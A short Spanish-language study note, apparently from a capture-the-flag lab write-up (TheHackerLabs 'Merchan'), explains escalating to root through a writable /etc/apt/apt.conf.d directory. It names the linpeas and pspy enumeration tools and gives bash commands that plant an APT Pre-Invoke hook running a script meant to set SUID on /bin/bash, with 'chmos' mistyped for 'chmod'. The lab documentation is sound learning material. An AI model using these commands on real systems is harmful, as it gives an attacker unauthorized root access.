- Tags : #escalada #escalada_privilegios #escalada_privilegios_apt #recursos #recursos_hackerlabs #recursos_github #enumeration #enumeration_lenpeas

**Recursos**: Maquina Merchan TheHackerLabs


Utilizaremos linpeas.sh para enumerar y detecta que en /etc/apt/apt.conf.d hay algo que no esta configurado correctamente y es que otros tienen permiso de escritura en este directorio lo que pasa es que cuando se utilice el comando apt siempre revisa y ejecuta los que hay en este directorio . Utilizaremos pspy para enumerar procesos que estén en 2 plano para identificar posibles ejecuciones del comando apt

**Recurso**: PSPY [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)

```bash
echo "chmos u+s /bin/bash" > /tmp/script.sh
chmod +x /tmp/script.sh
echo 'APT::Update::Pre-Invoke {"/tmp/script.sh";};' > /etc/apt/apt.conf.d/99virus

 99virus  Puede ser cualquiera con una estructura #nombre
```